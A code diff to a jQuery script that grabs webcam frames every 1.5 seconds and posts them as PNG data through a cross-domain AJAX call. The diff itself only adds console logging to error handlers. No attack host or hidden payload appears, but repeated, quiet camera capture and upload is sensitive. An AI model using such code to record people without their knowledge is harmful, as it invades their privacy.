@@ -9,10 +9,12 @@ $(document).ready(function() {
         async: false,
         crossDomain: true, // Add this line for CORS
         success: function (result) {
-            // call the function that handles the response/results
+            // Call the function that handles the response/results
+            console.log(result);
         },
-        error: function () {
-            // handle the error, if needed
+        error: function (xhr, status, error) {
+            // Handle the error, log it, or display an alert
+            console.error("AJAX error:", status, error);
         }
     });
   }
@@ -35,8 +37,8 @@ $(document).ready(function() {
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
       handleSuccess(stream);
     } catch (e) {
-    //   errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-
+      // Handle the error, log it, or display an alert
+      console.error("navigator.getUserMedia error:", e.toString());
     }
   }
 
@@ -47,13 +49,10 @@ $(document).ready(function() {
 
     var context = canvas.getContext('2d');
     setInterval(function () {
-
       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData);
     }, 1500);
-
-
   }
 
   // Load init
